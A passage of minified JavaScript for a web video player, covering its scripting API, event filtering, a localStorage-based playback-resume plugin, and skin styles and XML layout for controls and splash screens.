W("selectSubtitles");null!=b&&(c.data=new Ab,c.data.id=b),c.dispatch(this.context)},setAudioById:function(b){var c=new W("selectAudio");null!=b&&(c.data=new $a,c.data.id=b),c.dispatch(this.context)},toggleFullscreen:function(){new W("fullscreenToggleRequest").dispatch(this.context)},repaint:function(){new na("repaint").dispatch(this.context)},on:function(b,c){"close"==b&&(this.onCloseBind=c)},add:function(b,c){try{var d=b.split(".");if(2<d.length)var q=d.pop(),X=d.join(".");else q=d.pop(),X="bs.player.core.events."+d.join("");null!=this.customVideoEventsFilterClass&&X==T.staticClassName||h.mobile&&X==T.staticClassName?this.getOrCreateEventsFilterByContext(this.context).add(q,c):V.getInstance().add(this.context,X,q,c)}catch(ra){b=yb.caught(ra).unwrap(),console.error(b)}},addOnce:function(b,c){try{var d=b.split(".");if(2<d.length)var q=d.pop(),X=d.join(".");else q=d.pop(),X="bs.player.core.events."+d.join("");null!=this.customVideoEventsFilterClass&&X==T.staticClassName||h.mobile&&X==T.staticClassName?this.getOrCreateEventsFilterByContext(this.context).addOnce(q,c):V.getInstance().addOnce(this.context,X,q,c)}catch(ra){b=yb.caught(ra).unwrap(),console.error(b)}},remove:function(b,c){try{var d=b.split(".");if(2<d.length)var q=d.pop(),X=d.join(".");else q=d.pop(),X="bs.player.core.events."+d.join("");null!=this.customVideoEventsFilterClass&&X==T.staticClassName||h.mobile&&X==T.staticClassName?this.getOrCreateEventsFilterByContext(this.context).remove(q,c):V.getInstance().remove(this.context,X,q,c)}catch(ra){b=yb.caught(ra).unwrap(),console.error(b)}},getVideoMetrics:function(){var b={};return T.addOnce(this.context,"setMetrics",(function(c){b=c.data})),new T("getMetrics").dispatch(this.context),b},getOrCreateEventsFilterByContext:function(b){return Object.prototype.hasOwnProperty.call(this.videoEventsFilterByContext.h,this.context)||(b=null!=this.customVideoEventsFilterClass?g.createInstance(wa[this.customVideoEventsFilterClass],[this.context]):new Fc(this.context),this.videoEventsFilterByContext.h[this.context]=b),this.videoEventsFilterByContext.h[this.context]},onDurationChange:function(b){this.durationTime=b.data.duration},onCurrentTimeChange:function(b){var c=this.currentTime!=b.data.currentTime;this.currentTime=b.data.currentTime,this.durationTime=b.data.duration,c&&(this.lastCurrentTimeChangeTs=(new Date).getTime()/1e3),this.media=b.data.media,this.adMedia=null,1==b.data.duration&&this.media instanceof xa&&(b.data.duration=1/0)},onMetadataData:function(b){null!=b&&(this.media=b=b.data,this.durationTime=b.duration)},onAdMetadataData:function(b){null!=b&&(this.adMedia=b.data)},onShowMessage:function(b){null!=b&&(this.message=b.data)},onCloseMessage:function(b){this.message=null},appGoingBackground:function(){new W("appGoingBackground").dispatch(this.context)},appGoingForeground:function(){new W("appGoingForeground").dispatch(this.context)},requestVideoQualityChange:function(b){var c=new W("requestVideoQualityChange");c.data=b,c.dispatch(this.context)},playerInfoShow:function(){new W("playerInfoShow").dispatch(this.context)},playerInfoHide:function(){new W("playerInfoHide").dispatch(this.context)},searchForThumbByTime:function(b,c){null!=this.get_player().modules.BradmaxThumbnailsService?this.get_player().modules.BradmaxThumbnailsService.searchForThumbByTime(b,c):c(null)},restartSkinHide:function(){new ma(ma.ANIMATE_SHOW).dispatch(this.context)},mediaType:function(b){var c=null;return b instanceof va&&(b instanceof xa?(c="Live",b instanceof Ca?c="LiveStream":b instanceof Ba?c="LiveChannel":b instanceof Ga&&(c="LiveProgramStream")):b instanceof za?c="Catchup":b instanceof Zb&&(c="Episode")),c},__class__:wc});var Lc=function(b){this.context=b};wa["bs.player.plugin.javascriptapi.JavascriptApiPictureInPicture"]=Lc,Lc.__name__="bs.player.plugin.javascriptapi.JavascriptApiPictureInPicture",Lc.prototype={context:null,destroy:function(){this.leave()},enter:function(){new W("pipEnter").dispatch(this.context)},leave:function(){new W("pipLeave").dispatch(this.context)},isAvailable:function(){return"pictureInPictureEnabled"in document},__class__:Lc};var Fc=function(b){this.context=b,this.holdedVideoPlayingEvent=null,this.listenersMap=new Jb,this.trackedVideoEvents=[],this.trackedVideoEvents.push("playing"),this.trackedVideoEvents.push("paused"),this.trackedVideoEvents.push("stopped"),this.trackedVideoEvents.push("complete"),this.attachInternalListeners()};wa["bs.player.plugin.javascriptapi.VideoEventsFilterForMobile"]=Fc,Fc.__name__="bs.player.plugin.javascriptapi.VideoEventsFilterForMobile",Fc.__interfaces__=[Hb],Fc.prototype={trackedVideoEvents:null,listenersMap:null,context:null,holdedVideoPlayingEvent:null,waitingPauseTimeoutTimer:null,attachInternalListeners:function(){for(var b=0,c=this.trackedVideoEvents;b<c.length;){var d=c[b];++b,V.getInstance().add(this.context,T.staticClassName,d,U(this,this.onVideoEvent))}},dispatchEvent:function(b){if(Object.prototype.hasOwnProperty.call(this.listenersMap.h,b.type))for(var c=0,d=this.listenersMap.h[b.type];c<d.length;){var q=d[c];++c,q(b)}},onVideoEvent:function(b){null==this.holdedVideoPlayingEvent?"playing"==b.type?(this.holdedVideoPlayingEvent=b,this.waitingPauseTimeoutTimer=Rb.delay(U(this,this.onWaitingPauseTimeout),50)):this.dispatchEvent(b):("paused"!=b.type&&(this.dispatchEvent(this.holdedVideoPlayingEvent),this.dispatchEvent(b)),this.waitingPauseTimeoutTimer.stop(),this.holdedVideoPlayingEvent=this.waitingPauseTimeoutTimer=null)},onWaitingPauseTimeout:function(){null!=this.holdedVideoPlayingEvent&&this.dispatchEvent(this.holdedVideoPlayingEvent),null!=this.waitingPauseTimeoutTimer&&this.waitingPauseTimeoutTimer.stop(),this.holdedVideoPlayingEvent=this.waitingPauseTimeoutTimer=null},add:function(b,c){-1!=this.trackedVideoEvents.indexOf(b)?(Object.prototype.hasOwnProperty.call(this.listenersMap.h,b)||(this.listenersMap.h[b]=[]),this.listenersMap.h[b].push(c)):V.getInstance().add(this.context,T.staticClassName,b,c)},addOnce:function(b,c){var d=this;-1!=this.trackedVideoEvents.indexOf(b)?this.add(b,(function(q){c(q),d.remove(b,c)})):V.getInstance().add(this.context,T.staticClassName,b,c)},remove:function(b,c){-1!=this.trackedVideoEvents.indexOf(b)?Object.prototype.hasOwnProperty.call(this.listenersMap.h,b)&&da.remove(this.listenersMap.h[b],c):V.getInstance().remove(this.context,T.staticClassName,b,c)},onPlayerDestroy:function(){},__class__:Fc};var dc=function(){lb.call(this),this.pluginConfig=Kb.readPluginConfig(this)};wa["bs.player.plugin.playbackresume.PlaybackResume"]=dc,dc.__name__="bs.player.plugin.playbackresume.PlaybackResume",dc.__super__=lb,dc.prototype=Ja(lb.prototype,{media:null,lastPosStored:null,mediaNormSourceUrl:null,isEnabled:function(){return!!this.pluginConfig.playbackResumeEnabled||this.get_variables().playbackResumeEnabled},create:function(){lb.prototype.create.call(this),this.isEnabled()&&(aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),T.add(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),T.add(this.context,"paused",U(this,this.onPaused)),window.addEventListener("beforeunload",U(this,this.beforePageUnload)))},destroy:function(){lb.prototype.destroy.call(this),this.isEnabled()&&(this.isValidMedia()&&this.saveCurrentPosition(),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),T.remove(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),T.remove(this.context,"paused",U(this,this.onPaused)),window.removeEventListener("beforeunload",U(this,this.beforePageUnload)))},onMetadataData:function(b){this.lastPosStored=this.media=null,null==b||null==b.data||b.data instanceof xa||(this.media=b.data,this.mediaNormSourceUrl=this.getNormalisedMediaSourceUrl(this.media),null!=this.mediaNormSourceUrl&&this.setResumePositionIfAvailable())},onCurrentTimeChange:function(b){this.isValidMedia()&&(null==this.lastPosStored||5<Math.abs(this.lastPosStored-this.media.mediaPlaybackInfo.currentTime))&&this.saveCurrentPosition()},onPaused:function(b){this.isValidMedia()&&this.saveCurrentPosition()},beforePageUnload:function(){this.isValidMedia()&&this.saveCurrentPosition()},isValidMedia:function(){return null!=this.media&&0<this.media.duration&&1/0>this.media.duration&&null!=this.media.mediaPlaybackInfo&&0<this.media.mediaPlaybackInfo.currentTime&&!(this.media instanceof xa)},loadLocalResumeHistory:function(){var b=null,c=Tb.getLocalStorage().getItem("_brplayer_resume");return null!=c&&(b=JSON.parse(c)),b},saveCurrentPosition:function(){var b=this.media.mediaPlaybackInfo.currentTime;if((b=Math.floor(b))!=this.lastPosStored&&(this.lastPosStored=b,null!=Tb.getLocalStorage()))try{var c=this.loadLocalResumeHistory();(c=null!=c?this.removeCurrentMediaFromHistory(c,this.mediaNormSourceUrl):[]).unshift({url:this.mediaNormSourceUrl,pos:Math.floor(b)}),20<c.length&&(c=c.slice(0,20)),Tb.getLocalStorage().setItem("_brplayer_resume",JSON.stringify(c))}catch(d){}},setResumePositionIfAvailable:function(){var b=this;if(null!=Tb.getLocalStorage())try{var c=this.loadLocalResumeHistory();if(null!=c)for(var d=0;d<c.length;){var q=[c[d]];++d,q[0].url==this.mediaNormSourceUrl&&q[0].pos&&(this.media.mediaUserSettings.resumePostion=q[0].pos,Rb.delay(function(X){return function(){var ra=new W("skinSeek");ra.data=X[0].pos,ra.dispatch(b.context)}}(q),0))}}catch(X){}},removeCurrentMediaFromHistory:function(b,c){for(var d=[],q=0;q<b.length;){var X=b[q];++q,X.url!=c&&d.push(X)}return d},getNormalisedMediaSourceUrl:function(b){return null==b.source||0==b.source.length||null==b.source[0]||null==b.source[0].url?null:b.source[0].url.replace(/^[^:]+:/,"")},__class__:dc});var Hc=function(){};wa["haxe.IMap"]=Hc,Hc.__name__="haxe.IMap",Hc.__isInterface__=!0;var Jb=function(){this.h=Object.create(null)};wa["haxe.ds.StringMap"]=Jb,Jb.__name__="haxe.ds.StringMap",Jb.__interfaces__=[Hc],Jb.prototype={h:null,__class__:Jb};var lc=function(){};wa["bs.player.plugin.skin.Assets"]=lc,lc.__name__="bs.player.plugin.skin.Assets",lc.init=function(b,c,d,q,X){lc.styles.h[c]=q,lc.colors.h[c]=X},lc.destroy=function(b){},lc.getIcon=function(b,c){return m.field(lc.styles.h[b],c)},lc.getColor=function(b,c){return"#"==c.charAt(0)?c:m.field(lc.colors.h[b],c)},lc.setColor=function(b,c,d){lc.colors.h[b][c]=d},lc.setColorScheme=function(b,c){lc.colors.h[b]=c},lc.getColorScheme=function(b){return lc.colors.h[b]},lc.replaceInObject=function(b,c,d){if("string"==typeof b){if(b==c)return d}else if(!("number"==typeof b&&(0|b)===b||"number"==typeof b||"number"==typeof b&&(0|b)===b||"boolean"==typeof b))for(var q=m.fields(b),X=0;X<q.length;){var ra=q[X];++X,b[ra]=lc.replaceInObject(m.field(b,ra),c,d)}return b},lc.__initFonts__=function(){var b=m.field(window,"bradmax"),c=m.field(b,"player");null==c.registerFont&&(c.fonts={},c.registerFont=function(d,q){Object.prototype.hasOwnProperty.call(c.fonts,d)||(c.fonts[d]=!0,d="."+d+"{font-family:"+d+"}@font-face{font-family:'"+d+"';src: url(data:font/woff;charset=utf-8;base64,"+q+"); format('woff');}",(q=window.document.createElement("style")).textContent=d,window.document.head.appendChild(q))})},lc.__initCss__=function(){for(var b=null,c=window.document.head.getElementsByTagName("style"),d=0,q=c.length;d<q;){var X=d++;if("bsplayer-styles"==c.item(X).getAttribute("id")){b=c.item(X);break}}null==b&&((b=window.document.createElement("style")).id="bsplayer-styles",b.textContent=' .bsplayer { display: block; position: relative; width: 100%; height: 100%; min-height: 150px; background: #000000; overflow: hidden; } .bsplayer .Font_prerenderer { position: absolute !important; z-index: -1; width: 1px; height: 1px; line-height: 1px; font-size:0; color:transparent; overflow: hidden; clip: rect(1px 1px 1px 1px); clip: rect(1px, 1px, 1px, 1px); clip-path: polygon(0px 0px, 0px 0px,0px 0px, 0px 0px); } .bsplayer .Skin { background: rgba(0,0,0,0); } .bsplayer video { position: absolute; top:0; left: 0; width: 100%; height: 100%; } .bsplayer iframe { border: none; } .bsplayer .enableGPU, .bsplayer .enableGPU *{ transform: translateZ(0); } .bsplayer .defaultElement { position: absolute; opacity: 1; text-align: left; vertical-align: text-top; } .bsplayer .buttonElement { cursor: pointer !important; background: transparent; } .bsplayer .buttonElement *{ cursor: pointer !important; pointer-events: none; } .bsplayer .buttonElement img { position: relative; } .bsplayer .textElement.alignLeft, .bsplayer .labelElement.alignLeft { text-align: left; } .bsplayer .textElement.alignRight, .bsplayer .labelElement.alignRight { text-align: right; } .bsplayer .textElement.alignCenter, .bsplayer .labelElement.alignCenter { text-align: center; } .bsplayer .textElement, .bsplayer .labelElement { cursor: default; line-height: 1.4285; font-weight: normal; text-overflow: ellipsis; word-break: break-word; display: block; font-size: 10px; } .bsplayer .textElement { white-space: normal; overflow: hidden; } .bsplayer .textElement.MessageText { overflow-y: auto; } .bsplayer .labelElement { overflow: hidden; white-space: nowrap; } .bsplayer .imageElement { position: absolute; width : auto; height: auto; } .bsplayer svg { box-sizing: border-box; pointer-events: none; } .bsplayer .hideElement { display: none !important; } .bsplayer .overflowHidden { overflow: hidden; } .bsplayer .withoutBorder { border-style: none; } .bsplayer .withBorder { border-style: solid; } .bsplayer .mouseEnable { pointer-events: auto; } .bsplayer .mouseDisable { pointer-events: none; } .bsplayer .defaultCursor { cursor: default; } .bsplayer .noneCursor { cursor: none; } .bsplayer video::cue { color: white; background-color: transparent; font-family:"Helvetica Neue", Helvetica, Arial,sans-serif; text-shadow: 0px 0px 7px #000000, 0px 0px 4px #000000, 0px 0px 10px #000000; font-size: 1em; } .bsplayer .htmlSubtitlesPlaceholder { width: 100%; height: 100%; } ',window.document.head.appendChild(b))};var qc=function(){lb.call(this),qc.skinConfig={style:"plugins/BasicSkin/themes/mole/style.json",logoXPosition:"left",advance:!1,logoAutohide:!1,resetColorScheme:"reset to skin default color scheme",skin:"mole",subtitles:null,shareButtons:"",COLOR_PROGRESS_2:"#000000",layout:"plugins/BasicSkin/themes/mole/layout.xml",COLOR_PROGRESS_1:"#000000",logoYPosition:"top",logoLink:null,COLOR_PROGRESS_0:"#aaaaaa",logoFile:null,autoplay:!1,COLOR_CONTROLS_1:"#000000",COLOR_BASE_1:"#ffffff",branding:null,startEndSplash:null,showSkinOnInit:!0,audio:null,videoCastEnabled:!0,COLOR_BASE_0:"#000000",pictureInPictureButtonVisible:!0,COLOR_TEXT:"#ffffff",logoLinkTarget:"_blank",skinAndColor:null,volume:.7,COLORS_SHADE_MAP_BASE:"#000000",COLOR_CONTROLS_2:"#000000",COLOR_CONTROLS_0:"#000000",endSplash:"reload"},qc.skinLayout=r.parse('<?xml version="1.0" encoding="UTF-8"?> <bs:Skin xmlns:bs="http://bigsoda.pl" name="mole"> \x3c!--ClickableLayer--\x3e <bs:Box id="ClickableLayer" left="0" right="0" top="0" bottom="0"></bs:Box> \x3c!-- start splash image --\x3e <bs:Box id="SplashImageContainer" top="0" left="0" right="0" bottom="0"> <bs:Image id="SplashImageHolder" /> </bs:Box> \x3c!--TitleBox--\x3e <bs:Box id="TitleBox" left="50" right="50" bottom="40" height="80" mouseEnable="false" hideHeight="<320"> <bs:ResponsiveLabel id="TitleLabel" mouseEnable="false" align="bottom"/> <bs:ResponsiveLabel id="TitleSublabel" mouseEnable="false" align="bottom"/> </bs:Box> \x3c!--BufferSpinner--\x3e <bs:Spinner id="BufferSpinner" width="75" height="75" centerX="0" centerY="-10"/> \x3c!--DECIDE STAY OR REMOVE--\x3e \x3c!--<bs:Box id="CloseBox" top="23" right="28" width="130"> <bs:Label id="CloseLabel" left="0" top="12">Close trailer</bs:Label> <bs:IconButton id="CloseButton" right="0" width="42" height="42"/> </bs:Box>--\x3e \x3c!--SeriesPopup--\x3e <bs:Box id="SeriesPopup" width="290" percentHeight="0.65" bottom="2"> <bs:Label id="SeriesPopupTitle" left="35" right="35" align="center" top="12">Series</bs:Label> <bs:IconButton id="SeriesPopupLeftButton" width="15" height="22" top="12" left="17"></bs:IconButton> <bs:IconButton id="SeriesPopupRightButton" width="15" height="22" top="12" right="17"></bs:IconButton> <bs:ItemListScroll id="SeriesList" top="45" bottom="3" width="290"> <bs:EpisodeListItemRenderer id="SeriesPopupItemRenderer" width="290" height="48" collapsedHeight="48" expandedHeight="274" class="bs.player.plugin.skin.ui.renderer.EpisodeListItemRenderer"> <bs:Label id="SeriesPopupItemLabel" left="10" right="45" top="18" align="center"></bs:Label> <bs:Icon id="SeriesPopupExpandButton" top="18" right="19" width="12" height="12"></bs:Icon> <bs:Box id="SeriesPopupItemImageContainer" left="0" right="5" top="51" height="160"> <bs:Image id="SeriesPopupItemImageHolder"/> <bs:Icon id="SeriesPopupPlayButton" centerX="0" centerY="0" width="45" height="45"></bs:Icon> </bs:Box> <bs:Text id="SeriesPopupItemDescription" left="10" right="18" top="218" height="52"></bs:Text> </bs:EpisodeListItemRenderer> <bs:Box id="SeriesPopupSeparator" width="290" height="2" bottom="0"></bs:Box> </bs:ItemListScroll> <bs:Box id="SeriesPopupSeparator" top="43" left="0" width="290" height="2"></bs:Box> <bs:Box id="SeriesPopupSeparator" bottom="2" left="0" width="290" height="2"></bs:Box> <bs:Spinner id="SeriesBufferSpinner" width="50" height="50" centerX="0" centerY="0"/> </bs:Box> \x3c!--ChannelsPopup--\x3e <bs:Box id="ChannelsPopup" width="290" percentHeight="0.65" bottom="2"> <bs:Label id="ChannelsPopupTitle" left="112" top="10">Channels</bs:Label> <bs:ItemListScroll id="ChannelsList" top="44" bottom="5" width="290"> <bs:ChannelListItemRenderer id="ChannelsPopupItemRenderer" width="290" height="62" class="bs.player.plugin.skin.ui.renderer.ChannelListItemRenderer"> <bs:Box id="ChannelsPopupItemLogoContainer" left="14" top="12" width="64" height="36"> <bs:Image id="ChannelsPopupItemLogoHolder"/> <bs:Spinner id="ChannelsPopupItemLogoSpinner" width="24" height="24" centerX="0" centerY="0"/> </bs:Box> <bs:Label id="ChannelsPopupItemLabel" width="145" left="93" top="14" height="37"/> <bs:Box id="ChannelsPopupItemTrack" left="93" top="36" height="4" width="147"/> <bs:Box id="ChannelsPopupItemProgress" left="93" top="36" height="4" width="90"/> <bs:Icon id="ChannelsPopupItemIcon" left="250" top="21" height="19" width="20"/> </bs:ChannelListItemRenderer> <bs:Box id="ChannelsPopupSeparator" left="0" top="61" height="1" width="290"/> </bs:ItemListScroll> <bs:Box id="SeriesPopupSeparator" top="43" left="0" width="290" height="2"></bs:Box> <bs:Box id="SeriesPopupSeparator" bottom="2" left="0" width="290" height="2"></bs:Box> </bs:Box> \x3c!--DECIDE STAY OR REMOVE--\x3e \x3c!--<bs:Box id="PlayResumePopup" top="0" left="0" right="0" bottom="0"> <bs:Box centerY="0" centerX="0" width="650" height="50"> <bs:Box id="PlayResumeStart" width="310" height="50" top="0" left="0"> <bs:Box id="PlayResumeStartBackground" top="0" left="0" right="8" bottom="8"/> <bs:IconButton id="PlayResumeStartIcon" width="22" height="20" left="17" top="11"/> <bs:Label id="PlayResumeStartLabel" left="55" top="5">Start from beginning</bs:Label> </bs:Box> <bs:Box id="PlayResumeContinue" width="310" height="50" top="0" left="340"> <bs:Box id="PlayResumeContinueBackground" top="0" left="0" right="8" bottom="8"/> <bs:IconButton id="PlayResumeContinueIcon" width="22" height="20" left="26" top="11"/> <bs:Label id="PlayResumeContinueLabel" left="65" top="5">Continue watching</bs:Label> </bs:Box> </bs:Box> </bs:Box>--\x3e \x3c!--splashes--\x3e <bs:Box id="SplashHolder" top="0" left="0" right="0" bottom="0" mouseEnable="false" hideHeight="<150"> \x3c!-- end splash image for live streams --\x3e <bs:Box id="EndSplashImageContainer" top="0" left="0" right="0" bottom="0"> <bs:Image id="EndSplashImageHolder" /> </bs:Box> \x3c!-- end splash reload --\x3e <bs:IconButton id="EndSplashDefaultReloadButton" centerX="0" centerY="-10" width="85" height="85"/> \x3c!-- end splash social --\x3e <bs:IconButton id="EndSplashSocialEmbed" left="0" centerY="0" width="100" height="85"/> <bs:IconButton id="EndSplashSocialMail" left="85" centerY="0" width="100" height="85"/> <bs:IconButton id="EndSplashSocialFacebook" left="170" centerY="0" width="100" height="85"/> <bs:IconButton id="EndSplashSocialTwitter" left="255" centerY="0" width="100" height="85"/> <bs:IconButton id="EndSplashSocialLinkedIn" left="340" centerY="0" width="100" height="85"/> \x3c!-- end splash countdown --\x3e <bs:Box id="EndSplashCountdownBox" top="75" bottom="145" percentWidth="0.96" centerX="0" mouseEnable="false"> \x3c!-- with image percentWidth="1" maxWidth="400", without image percentWidth="0.5" maxWidth="600", default 0.5 400 changed by ctrl --\x3e <bs:HBox id="EndSplashCountdownContent" mouseEnable="false" percentWidth="0.5" percentHeight="1" minWidth="200" maxWidth="400" minHeight="150" maxHeight="300" centerX="0" centerY="0"> \x3c!-- left : image if present percentWidth="0.6" , default 0 changed by ctrl --\x3e <bs:Box id="EndSplashCountdownLeft" top="10" bottom="10" percentWidth="0"> <bs:Box id="EndSplashCountdownImageContainer" left="10" top="0" right="0" bottom="0"> <bs:Spinner id="EndSplashCountdownImageSpinner" width="48" height="48" centerX="0" centerY="0" mouseEnable="false"/> <bs:Image id="EndSplashCountdownImageHolder" /> </bs:Box> </bs:Box> \x3c!-- right : counter with image percentWidth="0.4", without image percentWidth="1" , default 1 changed by ctrl --\x3e <bs:Box id="EndSplashCountdownRight" top="10" bottom="10" percentWidth="1"> \x3c!-- label --\x3e <bs:Box top="0" left="10" right="10" percentHeight="0.1" overflowHidden="true"> <bs:ResponsiveLabel id="EndSplashCountdownLabel" align="bottom">Next video</bs:ResponsiveLabel> </bs:Box> \x3c!-- sublabel --\x3e <bs:Box left="10" right="10" centerY="0" percentHeight="0.8"> <bs:Box top="0" left="0" right="0" percentHeight="0.2" overflowHidden="true"> <bs:ResponsiveLabel id="EndSplashCountdownTitle" align="top"/> </bs:Box> </bs:Box> \x3c!-- counter --\x3e <bs:Box left="0" right="0" centerY="-5" percentHeight="0.6" minHeight="100" maxHeight="160" overflowHidden="true"> <bs:Spinner id="EndSplashCountdownSpinner" top="-3" bottom="3" left="0" right="0"/> <bs:ResponsiveLabel id="EndSplashCountdownCounter" align="middle"/> </bs:Box> \x3c!-- play btn con --\x3e <bs:Box bottom="0" left="10" right="10" percentHeight="0.2" overflowHidden="true"> <bs:Button id="EndSplashCountdownButton" percentWidth="0.4" minWidth="80" maxWidth="100" percentHeight="0.3" minHeight="24" maxHeight="64" centerY="0" centerX="0"> <bs:Box left="0" percentWidth="0.7" centerY="0" percentHeight="0.7"> <bs:Box left="15" right="0" top="0" bottom="0" overflowHidden="true"> <bs:ResponsiveLabel id="EndSplashCountdownButtonLabel" align="middle" mouseEnable="false">Play now</bs:ResponsiveLabel> </bs:Box> </bs:Box> <bs:Box right="0" percentWidth="0.3" centerY="0" percentHeight="0.7"> <bs:Icon id="EndSplashCountdownButtonIcon" top="0" bottom="0" left="0" right="0" mouseEnable="false"/> </bs:Box> </bs:Button> </bs:Box> </bs:Box> </bs:HBox> </bs:Box> \x3c!-- end splash Tiles --\x3e <bs:Box id="EndSplashTilesBox" top="70" bottom="120" percentWidth="1" maxWidth="1600" minHeight="170" centerX="0" mouseEnable="false"> <bs:ItemTiles id="EndSplashTiles" percentWidth="1" percentHeight="1" centerX="0" centerY="0" mouseEnable="false"> <bs:EndSplashTilesItemRenderer id="EndSplashTilesItemRenderer" width="200" height="150" class="bs.player.plugin.skin.ui.renderer.EndSplashTilesItemRenderer"> <bs:Box id="EndSplashTilesItemImageContainer" left="10" top="10" right="10" bottom="30" mouseEnable="false"> <bs:Image id="EndSplashTilesItemImageHolder" mouseEnable="false"/> <bs:Icon id="EndSplashTilesItemImagePlaceholder" width="24" height="24" centerX="3" centerY="0" mouseEnable="false"/> <bs:Spinner id="EndSplashTilesItemImageSpinner" width="48" height="48" centerX="0" centerY="0" mouseEnable="false"/> </bs:Box> <bs:HBox id="EndSplashTilesItemInfo" left="10" right="10" bottom="23" mouseEnable="false"> <bs:Label id="EndSplashTilesItemInfoTitle" percentWidth="1" mouseEnable="false">Title</bs:Label> <bs:Label id="EndSplashTilesItemInfoDuration" width="50" right="2" mouseEnable="false">00:00:00</bs:Label> </bs:HBox> </bs:EndSplashTilesItemRenderer> <bs:Spacer id="EndSplashTilesItemGapRenderer" width="20" height="15" mouseEnable="false"></bs:Spacer> </bs:ItemTiles> </bs:Box> \x3c!-- start splash play --\x3e <bs:IconButton id="StartSplashDefaultPlayButton" centerX="0" centerY="-10" percentWidth="0.12" height="85"/> <bs:IconButton id="StartSplashDefaultPauseButton" centerX="0" centerY="-10" percentWidth="0.12" height="85"/> </bs:Box> \x3c!--ControlbarBox--\x3e <bs:HBox id="ControlbarBox" left="0" right="0" bottom="0" height="40"> <bs:IconButton id="PlayPauseReloadButton" top="0" left="0" width="40" height="40"/> <bs:HBox id="ControlbarContainer" top="0" percentWidth="1" height="40"> <bs:Spacer width="10" /> <bs:Label id="ControlbarTimeLabel" top="14" height="12" width="50" hideWidth="<250"/> <bs:Spacer width="10" hideWidth="<250"/> <bs:Box id="ProgressbarBox" percentWidth="1" top="0" height="40"> \x3c!--Progressbar--\x3e <bs:Button id="ProgressbarTrack" left="0" top="18" right="0" height="5" hideWidth="<200"> \x3c!--Progressbar Segment List--\x3e <bs:ItemHList id="ProgressbarSegmentList" left="0" right="0" bottom="0" top="0"> <bs:ProgressSegmentRenderer id="ProgressbarSegmentRenderer" right="0" left="0" bottom="0" top="0" class="bs.player.plugin.skin.ui.renderer.ProgressSegmentRenderer"> <bs:Box id="ProgressbarSegmentBackground" left="0" right="0" bottom="0" top="0"/> <bs:Box id="ProgressbarSegmentProgress" left="0" right="0" bottom="0" top="0"/> <bs:Box id="ProgressbarSegmentGap" width="2" /> </bs:ProgressSegmentRenderer> </bs:ItemHList> \x3c!--Progressbar Marker List--\x3e <bs:ItemArray id="ProgressbarMarkerList" left="0" right="0" bottom="0" top="0"> <bs:ProgressMarkerRenderer id="ProgressbarMarkerRenderer" width="5" top="-2" bottom="-2" class="bs.player.plugin.skin.ui.renderer.ProgressMarkerRenderer"> <bs:Box id="ProgressbarMarker" left="0" right="0" bottom="0" top="0"/> </bs:ProgressMarkerRenderer> </bs:ItemArray> </bs:Button> \x3c!--ProgressbarIndicator--\x3e <bs:Button id="ProgressbarIndicator" width="11" height="11" top="15" hideWidth="<200"/> </bs:Box> <bs:Spacer width="15" /> <bs:Label id="ControlbarDurationLabel" top="14" height="12" width="50" hideWidth="<300"/> </bs:HBox> <bs:IconButton id="ControlbarLiveButton" width="40" height="40" top="0" right="0" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="VideoQualityButton" top="0" right="0" width="40" height="40" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="AudioButton" top="0" right="0" width="40" height="40" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="SubtitleButton" top="0" right="0" width="40" height="40" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="SeriesButton" top="0" right="0" width="40" height="40" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="ChannelsButton" top="0" right="0" width="40" height="40" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="VolumeButton" top="0" right="0" width="40" height="40" hideWidth="<180" hideHeight="<220"/> <bs:IconButton id="PictureInPictureButton" top="0" right="0" width="40" height="40" hideWidth="<400" hideHeight="<220"/> <bs:IconButton id="AirPlayButton" top="0" right="0" width="40" height="40" hideWidth="<280" hideHeight="<220"/> <bs:IconButton id="ChromecastButton" top="0" right="0" width="40" height="40" hideWidth="<280" hideHeight="<220"/> <bs:IconButton id="FullscreenButton" top="0" right="0" width="40" height="40"/> </bs:HBox> \x3c!--ProgressPopup--\x3e <bs:Box id="ProgressPopup" bottom="0" left="0" minWidth="60" maxWidth="160" minHeight="16" maxHeight="120" mouseEnable="false"> <bs:Icon id="ProgressPopupBackgroundTip" width="24" height="24" align="center" mouseEnable="false"/> <bs:Box id="ProgressPopupBackground" top="-6" left="-8" bottom="-6" right="-8" mouseEnable="false"/> <bs:ItemArray id="ProgressPopupThumbnails" top="-8" left="-8" right="-8" overflowHidden="true" mouseEnable="false"> <bs:ProgressThumbRenderer id="ProgressThumbRenderer" left="0" right="0" bottom="0" top="0" overflowHidden="true" mouseEnable="false" class="bs.player.plugin.skin.ui.renderer.ProgressThumbRenderer"> <bs:Box id="ProgressThumbRendererImage" left="0" right="0" bottom="0" top="0" mouseEnable="false"/> </bs:ProgressThumbRenderer> </bs:ItemArray> <bs:Label id="ProgressPopupExtraLabel" align="center" mouseEnable="false"/> <bs:Label id="ProgressPopupLabel" align="center" mouseEnable="false"/> </bs:Box> \x3c!--VolumePopup--\x3e <bs:Box id="VolumePopup" width="40" height="120" bottom="2"> \x3c!--<bs:Box id="VolumePopupBackground" left="0" width="40" height="120"/>--\x3e <bs:Button id="VolumeTrack" left="17" width="5" bottom="10" height="100"> <bs:Box id="VolumeProgress" left="0" width="5" bottom="0" percentHeight="1" /> <bs:Button id="VolumeIndicator" left="-4" width="13" height="13"/> </bs:Button> </bs:Box> \x3c!--SubtitlePopup--\x3e <bs:Box id="SubtitlePopup" width="140" bottom="2"> <bs:Box id="SubtitlePopupContainer" left="30" right="30" top="10" bottom="0"> <bs:ItemListScroll id="SubtitleList" top="0" bottom="0" width="140"> <bs:LabelRenderer id="SubtitlePopupItemRenderer" width="140" height="40" class="bs.player.plugin.skin.ui.renderer.LabelRenderer"> <bs:Box id="SubtitlePopupItemIndicator" top="15" left="15" width="10" height="10"/> <bs:Label id="SubtitlePopupItemLabel" left="35" top="12" height="20" width="100"/> </bs:LabelRenderer> </bs:ItemListScroll> </bs:Box> </bs:Box> \x3c!--AudioPopup--\x3e <bs:Box id="AudioPopup" width="140" bottom="2"> <bs:Box id="AudioPopupContainer" left="30" right="30" top="10" bottom="0"> <bs:ItemListScroll id="AudioList" top="0" bottom="0" width="140"> <bs:LabelRenderer 